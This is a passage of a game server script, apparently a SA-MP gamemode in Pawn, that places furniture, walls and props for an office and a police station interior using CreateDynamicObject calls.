	CreateDynamicObject(1714, 257.10999, 1762.81006, 700.09998,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1714, 254.17999, 1762.77002, 700.09998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1502, 251.39999, 1759.68005, 699.95001,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, 250.95000, 1759.81995, 700.09998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2395, 252.48000, 1759.81995, 702.46002,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2395, 249.78999, 1759.58997, 702.46002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, 248.19000, 1759.57996, 700.09998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1704, 254.31000, 1753.90002, 700.09003,   0.00000, 0.00000, 135.00000);
	CreateDynamicObject(1704, 256.22000, 1754.48999, 700.09003,   0.00000, 0.00000, -135.00000);
	CreateDynamicObject(1815, 254.42000, 1754.72998, 700.09003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2247, 254.89000, 1755.31995, 700.98999,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 253.33000, 1754.94995, 700.09998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 256.59000, 1754.91003, 700.09998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19466, 253.95000, 1759.94995, 701.91998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 256.17001, 1759.94995, 701.91998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 258.39999, 1759.94995, 701.91998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19376, 259.00000, 1763.90002, 699.98999,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(1502, 254.53000, 1768.95996, 699.95001,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 262.60999, 1772.18005, 701.65002,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(19450, 263.67001, 1770.76001, 701.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 257.75000, 1783.81995, 701.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 257.75000, 1777.43005, 701.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, 259.37000, 1782.07996, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, 265.76001, 1782.07996, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 268.39999, 1775.63000, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 256.17001, 1781.31006, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2606, 256.20999, 1781.15002, 702.56000,   13.50000, 0.00000, 0.00000);
	CreateDynamicObject(2165, 255.78000, 1780.59998, 700.09003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1806, 256.45001, 1779.58997, 700.09003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2078, 255.16000, 1777.81995, 700.10999,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2462, 257.00000, 1776.04004, 700.26001,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19418, 257.25000, 1776.19995, 701.06000,   90.00000, 90.00000, 90.00000);
	CreateDynamicObject(19418, 256.92999, 1776.09998, 701.06000,   90.00000, 90.00000, 324233.00000);
	CreateDynamicObject(19418, 257.04001, 1776.30005, 701.06000,   90.00000, 90.00000, 342.00000);
	CreateDynamicObject(334, 257.00000, 1776.07996, 701.40997,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(2037, 257.28000, 1776.14001, 701.81000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(348, 256.85999, 1776.16003, 701.77002,   90.00000, 0.00000, 45.00000);
	CreateDynamicObject(19376, 268.67999, 1783.12000, 700.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 268.70999, 1773.53003, 700.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19450, 262.09000, 1787.44995, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 269.72000, 1784.41003, 701.65002,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(19450, 269.60999, 1780.35999, 701.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, 272.14999, 1782.07996, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, 262.57001, 1782.07996, 701.65002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, 262.67999, 1786.88000, 701.65002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1702, 261.92999, 1772.37000, 700.08002,   0.00000, 0.00000, 225.00000);
	CreateDynamicObject(2315, 259.75000, 1772.14001, 700.09003,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(2315, 266.10001, 1777.94995, 700.09003,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(1702, 268.89001, 1779.57996, 700.08002,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1702, 267.63000, 1776.32996, 700.08002,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2251, 260.10001, 1772.70996, 701.40997,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2251, 266.94000, 1779.01001, 701.40997,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 260.76001, 1772.72998, 700.69000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 266.26001, 1777.77002, 700.69000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 266.34000, 1777.85999, 700.69000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1667, 266.20001, 1777.88000, 700.69000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1502, 258.59000, 1782.06006, 699.95001,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1502, 264.98001, 1782.06006, 699.95001,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2207, 265.48999, 1785.14001, 700.09003,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1714, 267.29001, 1785.67004, 700.09998,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(330, 266.98001, 1784.23999, 700.85999,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(2894, 265.87000, 1785.32996, 700.85999,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2608, 263.00000, 1785.06995, 701.21002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1962, 267.85001, 1786.13000, 701.85999,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(2185, 258.67001, 1785.34998, 700.09003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1714, 260.03000, 1786.59998, 700.09998,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(1704, 260.01999, 1783.92004, 700.09003,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2078, 262.38000, 1784.88000, 700.10999,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2007, 257.95001, 1786.73999, 700.01001,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2886, 257.82001, 1778.51001, 701.44000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2886, 257.70999, 1778.47998, 701.44000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19378, 247.74001, 1783.13000, 703.42999,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19378, 247.74001, 1773.55005, 703.42999,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19378, 258.23001, 1773.55005, 703.42999,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19378, 268.67999, 1783.12000, 703.42999,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19378, 268.70999, 1773.53003, 703.42999,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19378, 258.23999, 1783.14001, 703.42999,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(1502, 257.78668, 1776.65613, 700.08728,   0.00000, 0.00000, 90.73931);

	
	// ---------------------------- OFFICE -------------------------------------
	
	CreateDynamicObject(14597, 2815.54712, -1679.76794, 665.46301,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1491, 2813.73389, -1683.05603, 663.41602,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1491, 2813.76904, -1676.48596, 663.46600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1491, 2823.11011, -1683.03503, 663.46600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1491, 2823.10303, -1676.50195, 663.45898,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1491, 2811.21411, -1680.52100, 663.45898,   0.00000, 0.00000, 90.24100);
	CreateDynamicObject(1742, 2826.93994, -1690.16797, 663.45697,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1742, 2826.93994, -1688.69800, 663.46301,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1744, 2826.98999, -1686.21997, 664.85498,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1744, 2826.98999, -1684.23706, 665.18103,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2007, 2819.90503, -1692.94495, 663.46600,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(2007, 2820.95703, -1692.94800, 663.46600,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(14532, 2819.94604, -1685.22900, 664.46100,   0.00000, 0.00000, -146.25000);
	CreateDynamicObject(2008, 2822.63599, -1690.66602, 663.37299,   0.00000, 0.00000, -0.85900);
	CreateDynamicObject(1806, 2823.42505, -1691.63000, 663.49799,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1726, 2812.06592, -1685.90906, 663.46301,   0.00000, 0.00000, -270.00000);
	CreateDynamicObject(1726, 2818.45996, -1683.84705, 663.46301,   0.00000, 0.00000, -90.37800);
	CreateDynamicObject(2009, 2812.08594, -1692.71997, 663.47101,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2009, 2818.46704, -1692.81702, 663.47101,   0.00000, 0.00000, 86.80300);
	CreateDynamicObject(2009, 2818.47705, -1689.11304, 663.47101,   0.00000, 0.00000, 90.24100);
	CreateDynamicObject(2009, 2812.11694, -1689.30896, 663.47101,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2007, 2816.48511, -1692.87000, 663.37500,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(2007, 2814.53711, -1692.87195, 663.36603,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(2372, 2806.57788, -1677.54700, 663.47198,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2372, 2804.16504, -1677.55505, 663.47198,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2372, 2806.67212, -1682.47205, 663.47198,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2372, 2804.11890, -1682.43201, 663.47198,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2374, 2802.50708, -1681.57202, 664.57501,   0.00000, 0.00000, -270.00000);
	CreateDynamicObject(2374, 2802.53198, -1680.95605, 664.60699,   0.00000, 0.00000, -270.00000);
	CreateDynamicObject(2378, 2802.40698, -1680.16895, 664.60498,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2378, 2802.40698, -1679.50903, 664.62903,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1778, 2802.83203, -1676.87000, 663.48199,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2605, 2812.57593, -1674.87000, 663.86902,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(2605, 2812.59912, -1672.33801, 663.86902,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(2605, 2812.63208, -1669.52905, 663.86902,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(2605, 2818.03198, -1673.32104, 663.86902,   0.00000, 0.00000, 0.48200);
	CreateDynamicObject(2605, 2818.02295, -1670.62695, 663.86902,   0.00000, 0.00000, 0.48200);
	CreateDynamicObject(2605, 2817.98389, -1666.83899, 663.86902,   0.00000, 0.00000, -0.37800);
	CreateDynamicObject(2724, 2818.40308, -1688.30103, 664.01801,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2724, 2818.35107, -1692.05505, 663.94299,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2724, 2812.96704, -1689.21802, 664.01801,   0.00000, 0.00000, -180.24100);
	CreateDynamicObject(2724, 2812.91602, -1692.70203, 663.96802,   0.00000, 0.00000, -180.24100);
	CreateDynamicObject(1806, 2812.63599, -1668.46497, 663.48999,   0.00000, 0.00000, 176.18500);
	CreateDynamicObject(1806, 2812.50195, -1671.42505, 663.46503,   0.00000, 0.00000, 201.10800);
	CreateDynamicObject(1806, 2812.54199, -1673.83801, 663.48700,   0.00000, 0.00000, 201.10800);
	CreateDynamicObject(1806, 2818.16699, -1674.29895, 663.48999,   0.00000, 0.00000, 34.48100);
	CreateDynamicObject(1806, 2818.25391, -1671.69604, 663.48999,   0.00000, 0.00000, 34.48100);
	CreateDynamicObject(1806, 2818.14795, -1667.90100, 663.48999,   0.00000, 0.00000, 34.48100);
	CreateDynamicObject(1742, 2812.04199, -1666.10400, 663.44397,   0.00000, 0.00000, 2.81900);
	CreateDynamicObject(1742, 2815.11694, -1666.07800, 663.45697,   0.00000, 0.00000, 2.81900);
	CreateDynamicObject(16151, 2824.67407, -1666.95300, 663.86200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(643, 2820.90308, -1674.41504, 663.91602,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(643, 2820.45703, -1670.93298, 663.91302,   0.00000, 0.00000, 39.53400);
	CreateDynamicObject(1432, 2825.57788, -1672.29700, 663.60199,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(972, 2825.81494, -1680.24695, 663.21698,   0.00000, 0.00000, 0.00000);

	// ---------------------------- INTERIOR DA PSP ----------------------------

	CreateDynamicObject(630, 1568.40002, -1668.19995, 1101.07996,   0.00000, 0.00000, 50.00000);
	CreateDynamicObject(630, 1568.40002, -1683.00000, 1101.07996,   0.00000, 0.00000, -50.00000);
	CreateDynamicObject(630, 1574.80005, -1684.43994, 1108.09998,   0.00000, 0.00000, -50.00000);
	CreateDynamicObject(630, 1579.70435, -1665.04785, 1101.07996,   0.00000, 0.00000, -50.00000);
	CreateDynamicObject(630, 1586.28931, -1687.26965, 1101.07996,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(630, 1588.23999, -1684.43994, 1108.09998,   0.00000, 0.00000, 50.00000);
	CreateDynamicObject(986, 1591.00000, -1666.90002, 1092.80005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1491, 1555.96997, -1694.01746, 1100.07202,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1491, 1575.41296, -1681.18506, 1100.07202,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1491, 1575.41296, -1668.35498, 1100.07202,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1499, 1586.27502, -1664.60498, 1089.58801,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1502, 1570.45996, -1655.06934, 1098.80005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1523, 1554.33801, -1690.30249, 1100.08997,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1523, 1552.65845, -1690.30249, 1100.08997,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1523, 1550.97803, -1690.30249, 1100.08997,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1523, 1555.98999, -1692.34253, 1100.06995,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1536, 1556.05005, -1677.05005, 1100.05005,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1536, 1556.01294, -1674.04004, 1100.05005,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1546, 1557.92371, -1661.66028, 1100.98499,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1557.34399, -1661.32983, 1100.98499,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1569.97217, -1662.14124, 1100.98499,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1569.90784, -1661.30908, 1100.98499,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1569.86523, -1660.35339, 1100.98499,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1563.83374, -1652.58386, 1101.12000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1563.95544, -1652.46582, 1101.12000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1564.08228, -1652.49182, 1101.12000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1546, 1564.72998, -1652.22876, 1101.16504,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1649, 1569.00000, -1675.50000, 1103.25000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1649, 1569.00000, -1675.50000, 1103.25000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1649, 1569.00000, -1679.93994, 1103.25000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1649, 1569.00000, -1679.93994, 1103.25000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1649, 1569.00000, -1671.06006, 1103.25000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1649, 1569.00000, -1671.06006, 1103.25000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1649, 1563.52002, -1655.39001, 1099.80505,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1649, 1574.30005, -1689.40002, 1101.78003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1649, 1574.30005, -1689.40002, 1101.78003,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1649, 1576.80005, -1683.67004, 1108.50000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1649, 1576.80005, -1683.67004, 1108.50000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1649, 1568.15002, -1655.39001, 1099.80505,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1649, 1579.58997, -1689.40002, 1101.78003,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1649, 1579.58997, -1689.40002, 1101.78003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1649, 1584.00000, -1683.67004, 1108.50000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1649, 1584.00000, -1683.67004, 1108.50000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1649, 1586.78796, -1683.55505, 1101.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1649, 1585.69897, -1689.40002, 1101.78003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1649, 1585.69897, -1689.40002, 1101.78003,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1649, 1589.00000, -1694.00000, 1108.50000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1649, 1589.00000, -1694.00000, 1108.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1649, 1589.00000, -1698.50000, 1108.50000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1649, 1589.00000, -1698.50000, 1108.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1665, 1599.23328, -1712.06555, 1107.94995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1703, 1590.13000, -1680.30005, 1100.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1703, 1597.80005, -1694.00000, 1107.07996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1704, 1598.50000, -1711.94995, 1107.07996,   0.00000, 0.00000, 140.00000);
	CreateDynamicObject(1704, 1600.65002, -1711.34998, 1107.07996,   0.00000, 0.00000, -140.00000);
	CreateDynamicObject(1714, 1581.50000, -1707.59998, 1107.05005,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1714, 1604.44934, -1689.06897, 1107.05005,   0.00000, 0.00000, -110.00000);
	CreateDynamicObject(1714, 1604.32312, -1698.48865, 1107.05005,   0.00000, 0.00000, -110.00000);
	CreateDynamicObject(1714, 1604.07983, -1707.95313, 1107.05005,   0.00000, 0.00000, -110.00000);
	CreateDynamicObject(1715, 1578.80005, -1691.87000, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1578.80005, -1692.68005, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1578.80005, -1693.50000, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1578.80005, -1694.59998, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1578.80005, -1695.44995, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1578.80005, -1696.25000, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1578.80005, -1697.40002, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1578.80005, -1698.23999, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1584.30005, -1691.87000, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1578.80005, -1699.05005, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1584.30005, -1692.68005, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1584.30005, -1693.50000, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1578.80005, -1700.15002, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1584.30005, -1694.59998, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1578.80005, -1700.99902, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1584.30005, -1695.44995, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1578.80005, -1701.80005, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1584.30005, -1696.25000, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1578.80005, -1702.90515, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1584.30005, -1697.40002, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1584.30005, -1698.23999, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1578.80005, -1703.73999, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1584.30005, -1699.05005, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1578.80005, -1704.55005, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1584.30005, -1700.15002, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1584.30005, -1700.99902, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1584.30005, -1701.80005, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1584.30005, -1702.90515, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1584.30005, -1703.73999, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1715, 1584.30005, -1704.55005, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1721, 1562.45996, -1683.09998, 1100.07996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1721, 1562.45996, -1668.00000, 1100.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1721, 1563.25000, -1683.09998, 1100.07996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1721, 1563.25000, -1667.97083, 1100.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1721, 1564.00000, -1683.09998, 1100.07996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1721, 1564.00000, -1667.94226, 1100.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1721, 1582.85388, -1668.95374, 1100.07996,   0.00000, 0.00000, -60.00000);
	CreateDynamicObject(1721, 1582.85388, -1667.46301, 1100.07996,   0.00000, 0.00000, -120.00000);
	CreateDynamicObject(1721, 1581.28796, -1662.19995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1581.28796, -1660.80005, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1581.28796, -1658.50000, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1581.28796, -1657.19995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1584.50000, -1662.19995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1584.50000, -1660.80005, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1581.28796, -1654.69995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1584.50000, -1658.50000, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1581.28796, -1653.30005, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1584.50000, -1657.19995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1587.50000, -1662.19995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1587.50000, -1660.80005, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1584.50000, -1654.69995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1587.50000, -1658.50000, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1584.50000, -1653.30005, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1587.50000, -1657.19995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1590.80005, -1662.19995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1590.80005, -1660.80005, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1587.50000, -1654.69995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1587.50000, -1653.30005, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1590.80005, -1658.50000, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1590.80005, -1657.19995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1593.80005, -1662.19995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1593.80005, -1660.80005, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1590.80005, -1654.69995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1590.80005, -1653.30005, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1593.80005, -1658.50000, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1593.80005, -1657.19995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1593.80005, -1654.69995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1593.80005, -1653.30005, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, 1601.67371, -1689.23999, 1107.09741,   0.00000, 0.00000, -50.00000);
	CreateDynamicObject(1736, 1604.53503, -1707.94995, 1109.84314,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1738, 1589.40002, -1676.94995, 1090.15002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1738, 1589.40002, -1673.28015, 1090.15002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1738, 1589.40002, -1680.62000, 1090.15002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1738, 1589.40002, -1684.30005, 1090.15002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1738, 1589.40002, -1687.96997, 1090.15002,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1742, 1596.72498, -1683.65002, 1107.08997,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1742, 1598.62500, -1683.65002, 1109.13501,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(1742, 1599.59998, -1683.65002, 1107.08997,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1742, 1597.18994, -1693.40002, 1107.08997,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1742, 1598.16504, -1693.40002, 1109.13501,   0.00000, 180.00000, 180.00000);
	CreateDynamicObject(1742, 1600.06299, -1693.40002, 1107.08997,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1753, 1556.59998, -1672.19995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1753, 1556.59998, -1681.00000, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1776, 1556.48499, -1656.04504, 1101.13000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1800, 1583.50000, -1674.40002, 1089.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1800, 1583.50000, -1678.09998, 1089.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1800, 1583.50000, -1681.80005, 1089.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1800, 1583.50000, -1685.50000, 1089.50000,   0.00000, 0.00000, 90.00000);
